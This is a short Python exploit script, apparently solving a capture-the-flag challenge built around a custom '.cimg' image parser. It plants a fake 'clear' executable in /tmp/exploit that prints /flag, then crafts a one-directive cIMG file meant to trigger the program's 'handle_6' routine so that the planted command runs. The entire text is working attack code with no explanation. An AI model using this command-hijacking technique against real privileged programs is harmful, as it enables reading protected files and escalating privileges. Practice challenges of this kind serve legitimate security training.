import struct
import os

def create_exploit():
    # Create a malicious 'clear' command
    os.makedirs("/tmp/exploit", exist_ok=True)
    with open("/tmp/exploit/clear", "w") as f:
        f.write("""#!/bin/sh
cat /flag
exit 0
""")
    os.chmod("/tmp/exploit/clear", 0o755)

    # .cimg file to trigger handle_6
    with open("exploit.cimg", "wb") as f:
        f.write(
            b'cIMG' +                  # Magic
            struct.pack('<H', 4) +     # Version
            struct.pack('BB', 1, 1) +  # Dimensions
            struct.pack('<I', 1) +     # 1 directive
            b'\x06\x00' +              # handle_6
            b'\x00'                    # Dummy byte
        )

create_exploit()
